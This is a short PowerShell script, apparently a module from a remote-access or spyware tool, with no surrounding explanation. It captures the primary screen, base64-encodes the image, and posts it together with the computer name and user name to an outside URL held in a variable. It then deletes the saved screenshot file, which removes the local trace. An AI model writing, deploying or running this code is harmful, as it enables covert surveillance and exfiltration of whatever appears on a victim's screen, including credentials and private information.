Add-Type -AssemblyName System.Windows.Forms
$screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap 1920, 1080
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size)
$screenshotPath = "$env:TMP\" + $(Get-Date -Format "yyyy-MM-dd--HH-mm-ss") + ".png"
$bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()
$u = ($url + "file")
$base64Image = [convert]::ToBase64String((([System.IO.File]::ReadAllBytes($screenshotPath))))
Invoke-WebRequest -uri $u -Method Post -Body $(@{ "hostname" = "$env:COMPUTERNAME" + "-$Env:UserName"; "filename"=$screenshotPath; "file"=$base64Image} | ConvertTo-Json) -ContentType "application/json"
rm $screenshotPath;
echo done;